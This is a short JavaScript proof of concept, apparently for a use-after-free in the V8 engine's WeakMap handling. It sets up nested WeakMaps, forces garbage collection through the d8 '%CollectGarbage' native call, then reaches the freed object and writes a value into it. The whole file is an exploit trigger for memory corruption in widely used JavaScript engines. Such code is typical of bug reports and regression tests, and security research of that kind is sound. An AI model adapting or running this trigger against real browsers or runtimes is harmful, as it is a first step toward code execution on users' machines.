var wm = new WeakMap();
var k0 = { k: 0 };

function getUafObject(wm) {
  let innerWm = wm.get(wm.get(k0));
  return wm.get(  // v1
    innerWm.get(
      // v3
      innerWm.get(k0)  // k2
    )[0]);
}


function fml() {
  var innerWm = new WeakMap();

  var v0 = { v: 0 };

  var k1 = { k: 1 };
  var v1 = { v: 1 };

  var k2 = { k: 2 };

  var v3 = [k1];

  wm.set(v0, innerWm);
  wm.set(k1, v1);
  wm.set(k0, v0);

  innerWm.set(k0, k2);
  innerWm.set(k2, v3);
}

fml();

// RUN GC
% CollectGarbage(null);

// Access the UAF object
var uaf = getUafObject(wm);
uaf[0] = 0.1337;

console.log("[*] Done");
